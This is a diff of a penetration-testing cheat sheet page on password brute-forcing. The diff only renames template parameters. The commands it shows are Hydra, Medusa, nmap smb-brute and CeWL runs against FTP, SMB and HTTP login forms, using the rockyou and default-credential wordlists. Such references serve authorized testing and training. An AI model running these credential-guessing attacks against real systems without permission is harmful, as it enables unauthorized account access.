@@ -42,7 +42,7 @@ also include default passwords lists.
 
 #### CeWL [^cewl]
 ```sh
-cewl {{< param "war.rdomain" >}} -m 3 -w wordlist.txt
+cewl {{< param "m.RDOMAIN" >}} -m 3 -w wordlist.txt
 ```
 {{<details "Parameters">}}
 - `-m <length>`: Minimum word length.
@@ -121,7 +121,7 @@ See [Combo (Colon Separated) Lists](#combo-colon-separated-lists).
 #### Hydra [^hydra]
 
 ```sh
-hydra -v -l ftp -P /usr/share/wordlists/rockyou.txt -f {{< param "war.rhost" >}} ftp
+hydra -v -l ftp -P /usr/share/wordlists/rockyou.txt -f {{< param "m.RHOST" >}} ftp
 ```
 
 {{<details "Parameters">}}
@@ -135,7 +135,7 @@ hydra -v -l ftp -P /usr/share/wordlists/rockyou.txt -f {{< param "war.rhost" >}}
 
 #### Hydra [^hydra]
 ```sh
-hydra -v -t1 -l Administrator -P /usr/share/wordlists/rockyou.txt -f {{< param "war.rhost" >}} smb
+hydra -v -t1 -l Administrator -P /usr/share/wordlists/rockyou.txt -f {{< param "m.RHOST" >}} smb
 ```
 {{<details "Parameters">}}
 - `-v`: verbose mode.
@@ -147,7 +147,7 @@ hydra -v -t1 -l Administrator -P /usr/share/wordlists/rockyou.txt -f {{< param "
 
 #### [smb-brute](https://nmap.org/nsedoc/scripts/smb-brute.html) NSE Script.
 ```sh
-sudo nmap --script smb-brute -p U:137,T:139 {{< param "war.rhost" >}}
+sudo nmap --script smb-brute -p U:137,T:139 {{< param "m.RHOST" >}}
 ```
 
 ## Web Applications
@@ -155,19 +155,19 @@ sudo nmap --script smb-brute -p U:137,T:139 {{< param "war.rhost" >}}
 ### HTTP Basic Auth
 
 ```sh
-hydra -L users.txt -P /usr/share/wordlists/rockyou.txt {{< param "war.rdomain" >}} http-head /admin/
+hydra -L users.txt -P /usr/share/wordlists/rockyou.txt {{< param "m.RDOMAIN" >}} http-head /admin/
 ```
 
 ### HTTP Digest
 
 ```sh
-hydra -L users.txt -P /usr/share/wordlists/rockyou.txt {{< param "war.rdomain" >}} http-get /admin/
+hydra -L users.txt -P /usr/share/wordlists/rockyou.txt {{< param "m.RDOMAIN" >}} http-get /admin/
 ```
 
 ### HTTP POST Form
 
 ```sh
-hydra -l admin -P /usr/share/wordlists/rockyou.txt {{< param "war.rdomain" >}} https-post-form "/login.php:username=^USER^&password=^PASS^&login=Login:Not allowed"
+hydra -l admin -P /usr/share/wordlists/rockyou.txt {{< param "m.RDOMAIN" >}} https-post-form "/login.php:username=^USER^&password=^PASS^&login=Login:Not allowed"
 ```
 
 {{<details "Parameters">}}
@@ -187,7 +187,7 @@ e.g.,
 [^hydra]
 
 ```sh
-hydra -l admin -P /usr/share/wordlists/rockyou.txt {{< param "war.rdomain" >}} https-post-form "/login.php:username=^USER^&password=^PASS^&login=Login:Not allowed:H=Cookie\: PHPSESSID=if0kg4ss785kmov8bqlbusva3v"
+hydra -l admin -P /usr/share/wordlists/rockyou.txt {{< param "m.RDOMAIN" >}} https-post-form "/login.php:username=^USER^&password=^PASS^&login=Login:Not allowed:H=Cookie\: PHPSESSID=if0kg4ss785kmov8bqlbusva3v"
 ```
 
 ## Miscellaneous
@@ -200,7 +200,7 @@ Use a colon separated `login:pass` format,
 instead of `-L`/`-P` options.
 
 ```sh
-hydra -v -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt -f {{< param "war.rhost" >}} ftp
+hydra -v -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt -f {{< param "m.RHOST" >}} ftp
 ```
 {{<details "Parameters">}}
 - `-v`: verbose mode.
@@ -220,7 +220,7 @@ or as a list in a file.
 
 ```sh
 sed s/^/:/ /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt > /tmp/cplist.txt
-medusa -C /tmp/cplist.txt -h {{< param "war.rhost" >}} -M ftp
+medusa -C /tmp/cplist.txt -h {{< param "m.RHOST" >}} -M ftp
 ```
 
 {{<details "Parameters">}}
